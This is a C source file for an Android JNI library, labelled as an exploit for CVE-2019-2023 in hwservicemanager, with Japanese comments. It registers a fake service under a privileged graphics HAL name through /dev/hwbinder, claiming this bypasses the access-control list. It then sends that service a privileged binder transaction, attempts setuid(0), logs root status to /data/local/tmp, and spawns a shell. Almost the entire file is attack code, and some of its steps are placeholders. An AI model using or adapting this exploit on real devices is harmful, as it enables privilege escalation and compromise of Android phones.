#define _GNU_SOURCE
#include <jni.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <android/log.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/epoll.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/syscall.h>
#include <sys/uio.h>
#include <sched.h>
#include <signal.h>
#include <pthread.h>
#include <poll.h>

#include "binder.h"

#define LOG_TAG "CVE-2019-2023"
#define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, LOG_TAG, __VA_ARGS__)
#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)
#define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)

// hwservicemanager のコマンドコード
#define SVC_MGR_ADD_SERVICE 2
#define SVC_MGR_GET_SERVICE 1
#define SVC_MGR_LIST_SERVICES 3

// 特権サービス名（偽装対象）
#define TARGET_SERVICE "android.hardware.graphics.composer@2.1::IComposer"

static int binder_fd;
static int hwbinder_fd;

// ========== サービス登録（ACLバイパス） ==========
int register_fake_service(void) {
    LOGI("[*] Registering fake service with ACL bypass...");

    // /dev/hwbinder を開く（hwservicemanager はこちら）
    hwbinder_fd = open("/dev/hwbinder", O_RDWR);
    if (hwbinder_fd < 0) {
        LOGE("Failed to open /dev/hwbinder: %s", strerror(errno));
        return -1;
    }
    LOGI("[+] hwbinder_fd=%d", hwbinder_fd);

    // サービス名をパーセル形式にエンコード
    const char* service_name = TARGET_SERVICE;
    size_t name_len = strlen(service_name) + 1;
    size_t total_len = 4 + name_len;

    uint8_t* data = malloc(total_len);
    if (!data) {
        LOGE("malloc failed");
        close(hwbinder_fd);
        return -1;
    }

    // 長さフィールド（リトルエンディアン）
    data[0] = (uint8_t)(name_len & 0xFF);
    data[1] = (uint8_t)((name_len >> 8) & 0xFF);
    data[2] = (uint8_t)((name_len >> 16) & 0xFF);
    data[3] = (uint8_t)((name_len >> 24) & 0xFF);
    memcpy(data + 4, service_name, name_len);

    // トランザクション構築
    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx;

    memset(&tx, 0, sizeof(tx));
    tx.cmd = BC_TRANSACTION;
    tx.tdata.target.handle = 0;  // hwservicemanager は handle=0
    tx.tdata.code = SVC_MGR_ADD_SERVICE;
    tx.tdata.flags = 0;
    tx.tdata.data_size = total_len;
    tx.tdata.offsets_size = 0;
    tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;

    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;

    uint8_t read_buf[4096];
    bwr.read_size = sizeof(read_buf);
    bwr.read_buffer = (binder_uintptr_t)read_buf;

    int ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
    free(data);

    if (ret < 0) {
        LOGE("ioctl failed: %s", strerror(errno));
        close(hwbinder_fd);
        return -2;
    }

    LOGI("[+] Service registered successfully!");
    close(hwbinder_fd);
    return 0;
}

// ========== サービス呼び出し（特権操作） ==========
int call_fake_service(void) {
    LOGI("[*] Calling fake service...");

    hwbinder_fd = open("/dev/hwbinder", O_RDWR);
    if (hwbinder_fd < 0) {
        LOGE("Failed to open /dev/hwbinder for call: %s", strerror(errno));
        return -1;
    }

    // サービス名で GET_SERVICE を実行
    const char* service_name = TARGET_SERVICE;
    size_t name_len = strlen(service_name) + 1;
    size_t total_len = 4 + name_len;

    uint8_t* data = malloc(total_len);
    if (!data) {
        LOGE("malloc failed");
        close(hwbinder_fd);
        return -1;
    }

    data[0] = (uint8_t)(name_len & 0xFF);
    data[1] = (uint8_t)((name_len >> 8) & 0xFF);
    data[2] = (uint8_t)((name_len >> 16) & 0xFF);
    data[3] = (uint8_t)((name_len >> 24) & 0xFF);
    memcpy(data + 4, service_name, name_len);

    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx;

    memset(&tx, 0, sizeof(tx));
    tx.cmd = BC_TRANSACTION;
    tx.tdata.target.handle = 0;
    tx.tdata.code = SVC_MGR_GET_SERVICE;
    tx.tdata.flags = 0;
    tx.tdata.data_size = total_len;
    tx.tdata.offsets_size = 0;
    tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;

    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;

    uint8_t read_buf[4096];
    bwr.read_size = sizeof(read_buf);
    bwr.read_buffer = (binder_uintptr_t)read_buf;

    int ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
    free(data);

    if (ret < 0) {
        LOGE("GET_SERVICE failed: %s", strerror(errno));
        close(hwbinder_fd);
        return -1;
    }

    if (bwr.read_consumed < 4) {
        LOGE("No handle returned");
        close(hwbinder_fd);
        return -1;
    }

    int handle = *(int*)read_buf;
    LOGI("[+] Service handle: %d (0x%x)", handle, handle);

    if (handle == 0) {
        LOGE("Invalid handle");
        close(hwbinder_fd);
        return -1;
    }

    // 取得したハンドルに対して特権操作を送信（例: システムプロパティ読み取り）
    LOGI("[*] Sending privileged transaction to handle %d...", handle);

    // 特権コマンド（例: getSystemProperties など）
    // 実際の HAL インターフェースに合わせて調整が必要
    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
        uint32_t dummy_data;
    } __attribute__((packed)) tx2;

    memset(&tx2, 0, sizeof(tx2));
    tx2.cmd = BC_TRANSACTION;
    tx2.tdata.target.handle = handle;
    tx2.tdata.code = 1;  // 通常のメソッド呼び出し
    tx2.tdata.flags = 0;
    tx2.tdata.data_size = 4;
    tx2.tdata.offsets_size = 0;
    tx2.tdata.data.ptr.buffer = (binder_uintptr_t)&tx2.dummy_data;
    tx2.dummy_data = 0x12345678;

    struct binder_write_read bwr2;
    memset(&bwr2, 0, sizeof(bwr2));
    bwr2.write_size = sizeof(tx2);
    bwr2.write_buffer = (binder_uintptr_t)&tx2;

    uint8_t read_buf2[4096];
    bwr2.read_size = sizeof(read_buf2);
    bwr2.read_buffer = (binder_uintptr_t)read_buf2;

    ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr2);
    if (ret < 0) {
        LOGE("Privileged transaction failed: %s", strerror(errno));
        close(hwbinder_fd);
        return -1;
    }

    LOGI("[+] Privileged transaction succeeded! Response: %d bytes", bwr2.read_consumed);

    close(hwbinder_fd);
    return 0;
}

// ========== シェル起動（root確認用） ==========
int spawn_root_shell(void) {
    LOGI("[*] Attempting to spawn root shell...");

    // setuid(0) を試行（実際に root 権限があれば成功）
    if (setuid(0) != 0) {
        LOGE("setuid(0) failed: %s", strerror(errno));
    }

    uid_t uid = getuid();
    LOGI("[+] Current UID: %d", uid);

    if (uid == 0) {
        LOGI("[+] Root obtained!");
        system("echo 'uid=0(root)' > /data/local/tmp/root.log");
        system("id >> /data/local/tmp/root.log");
        system("getenforce >> /data/local/tmp/root.log");
        return 0;
    }

    // シェルを起動（権限があれば root シェルになる）
    pid_t pid = fork();
    if (pid == 0) {
        setuid(0);
        setgid(0);
        execl("/system/bin/sh", "sh", NULL);
        execl("/system/bin/bash", "bash", NULL);
        _exit(1);
    } else if (pid > 0) {
        int status;
        waitpid(pid, &status, 0);
    }

    LOGI("[-] Shell spawn attempt completed");
    return 0;
}

// ========== JNI エントリ ==========
JNIEXPORT jint JNICALL
Java_com_example_tzpoc_MainActivity_nativeExploitCVE20192023(JNIEnv* env, jclass clazz) {
    int ret;

    LOGI("========================================");
    LOGI("== CVE-2019-2023 hwservicemanager Exploit ==");
    LOGI("========================================");

    // Step 1: 偽装サービスを登録
    ret = register_fake_service();
    if (ret < 0) {
        LOGE("Failed to register fake service");
        return ret;
    }

    // Step 2: 登録したサービスを呼び出し
    ret = call_fake_service();
    if (ret < 0) {
        LOGE("Failed to call fake service");
        return ret;
    }

    // Step 3: root シェルを起動
    spawn_root_shell();

    LOGI("[+] Exploit completed!");
    return 0;
}
